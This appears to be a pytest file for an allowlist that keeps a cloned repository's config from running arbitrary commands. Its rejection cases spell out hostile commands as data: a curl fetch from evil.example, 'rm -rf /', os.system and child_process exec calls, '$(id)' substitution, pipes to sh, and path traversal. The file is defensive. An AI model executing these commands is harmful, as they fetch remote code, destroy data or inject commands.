"""gate/command_policy.py — a cloned repo's gates.json must not run arbitrary commands."""

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from gate.attest import detect_and_run_lint, detect_and_run_tests
from gate.command_policy import TRUSTED_RUNNERS, check_command


class TestCheckCommand:
    @pytest.mark.parametrize("argv", [
        ["python3", "-m", "pytest", "tests/", "-q"],
        ["pytest", "-q"],
        ["npm", "test", "--if-present"],
        ["npx", "vitest", "run"],
        ["yarn", "test"],
        ["pnpm", "lint"],
        ["go", "test", "./..."],
        ["cargo", "test"],
        ["make", "test"],
        ["ruff", "check", "."],
        ["python3", "-m", "compileall", "-q", "gate", "hooks"],
        ["dotnet", "test"],
        ["./gradlew", "test"],
        ["mvn", "-q", "test"],
    ])
    def test_allows_known_runners(self, argv):
        ok, reason = check_command(argv)
        assert ok is True, reason

    @pytest.mark.parametrize("argv", [
        ["curl", "https://evil.example/x.sh"],
        ["bash", "-c", "pytest"],
        ["sh", "-c", "rm -rf /"],
        ["python3", "-c", "import os; os.system('id')"],
        ["python3", "evil.py"],
        ["npm", "run", "postinstall"],
        ["npm", "exec", "--", "something"],
        ["make", "deploy"],
        ["wget", "http://x"],
        ["/tmp/pytest"],
        ["pytest", "-q", "$(id)"],
        ["pytest", "-q", "|", "sh"],
        ["pytest", "-q", ";", "curl", "x"],
        ["pytest", "-p", "evil_plugin"],
        ["node", "-e", "require('child_process').exec('id')"],
    ])
    def test_rejects_shell_and_network_commands(self, argv):
        ok, reason = check_command(argv)
        assert ok is False
        assert reason

    def test_empty_command_rejected(self):
        assert check_command([])[0] is False

    def test_runner_table_is_explicit(self):
        assert "pytest" in TRUSTED_RUNNERS
        assert "bash" not in TRUSTED_RUNNERS
        assert "curl" not in TRUSTED_RUNNERS


class TestAttestRefusesUntrusted:
    def test_attest_refuses_untrusted_command(self, tmp_path):
        marker = tmp_path / "ran"
        config = {"test_command": f"touch {marker}"}
        result = detect_and_run_tests(tmp_path, config)
        assert result.passed is False
        assert "not allowlisted" in result.detail
        assert not marker.exists()

    def test_attest_refuses_untrusted_lint_command(self, tmp_path):
        result = detect_and_run_lint(tmp_path, {"lint_command": ["bash", "-c", "true"]})
        assert result.passed is False
        assert "not allowlisted" in result.detail

    def test_attest_runs_trusted_command(self, tmp_path, monkeypatch):
        monkeypatch.delenv("PYTEST_CURRENT_TEST", raising=False)
        (tmp_path / "test_ok.py").write_text("def test_ok():\n    assert 2 + 2 == 4\n")
        result = detect_and_run_tests(tmp_path, {"test_command": "python3 -m pytest -q test_ok.py"})
        assert result.passed is True, result.detail


class TestPolicyInternals:
    def test_runner_name_rejects_paths_except_gradlew(self):
        from gate.command_policy import _runner_name

        assert _runner_name("pytest") == "pytest"
        assert _runner_name("./gradlew") == "./gradlew"
        assert _runner_name("/usr/bin/pytest") is None
        assert _runner_name("..\\pytest.exe") is None

    def test_check_command_reason_is_actionable(self):
        ok, reason = check_command(["python3", "script.py"])
        assert ok is False
        assert "python -m" in reason


class TestProjectLocalRunners:
    """A project-local virtualenv or node_modules/.bin runner is the normal
    spelling for most projects; it is accepted when the basename is a trusted
    runner, and the runner's own rules still apply."""

    @pytest.mark.parametrize("argv", [
        [".venv/bin/python", "-m", "pytest", "-q"],
        ["venv/bin/python3", "-m", "pytest", "tests/"],
        ["./.venv/bin/python", "-m", "pytest", "-q"],
        [".venv/bin/python3.12", "-m", "pytest", "-q"],
        ["env/bin/python", "-m", "unittest", "discover"],
        [".venv/bin/pytest", "-q"],
        [".venv/bin/ruff", "check", "."],
        [".venv/Scripts/python.exe", "-m", "pytest", "-q"],
        [".venv\\Scripts\\python.exe", "-m", "pytest", "-q"],
        ["node_modules/.bin/jest", "--ci"],
        ["node_modules/.bin/eslint", "src/"],
        ["./node_modules/.bin/vitest", "run"],
    ])
    def test_allows_project_local_trusted_runners(self, argv):
        ok, reason = check_command(argv)
        assert ok is True, reason

    @pytest.mark.parametrize("argv", [
        [".venv/bin/python", "evil.py"],
        [".venv/bin/python", "-c", "import os; os.system('id')"],
        [".venv/bin/bash", "-c", "id"],
        [".venv/bin/pip", "install", "x"],
        ["/opt/venv/bin/python", "-m", "pytest"],
        ["../other/.venv/bin/python", "-m", "pytest"],
        [".venv/bin/../../evil", "-m", "pytest"],
        ["node_modules/.bin/sh", "-c", "id"],
        ["node_modules/.bin/npm", "run", "postinstall"],
        ["build/.venv/bin/python", "-m", "pytest"],
    ])
    def test_rejects_other_paths_and_untrusted_basenames(self, argv):
        ok, reason = check_command(argv)
        assert ok is False
        assert reason

    def test_runner_name_maps_project_local_paths(self):
        from gate.command_policy import _runner_name

        assert _runner_name(".venv/bin/python") == "python"
        assert _runner_name(".venv/bin/python3.11") == "python3"
        assert _runner_name(".venv/Scripts/python.exe") == "python"
        assert _runner_name("node_modules/.bin/jest") == "jest"
        assert _runner_name(".venv/bin/bash") == "bash"  # resolved, then refused by the table
        assert _runner_name("/opt/venv/bin/python") is None

    def test_rejection_reason_mentions_project_local_spelling(self):
        ok, reason = check_command(["/opt/venv/bin/python", "-m", "pytest"])
        assert ok is False
        assert ".venv/bin/" in reason

    def test_attest_runs_project_venv_interpreter(self, tmp_path, monkeypatch):
        """End to end: the relative interpreter path resolves against the project root."""
        monkeypatch.delenv("PYTEST_CURRENT_TEST", raising=False)
        venv_bin = tmp_path / ".venv" / "bin"
        venv_bin.mkdir(parents=True)
        (venv_bin / "python").symlink_to(sys.executable)
        (tmp_path / "test_invoice.py").write_text(
            "def test_total():\n    assert round(19.99 * 3, 2) == 59.97\n"
        )
        result = detect_and_run_tests(tmp_path, {"test_command": ".venv/bin/python -m pytest -q"})
        assert result.passed is True, result.detail
        assert result.name == ".venv/bin/python -m pytest -q"
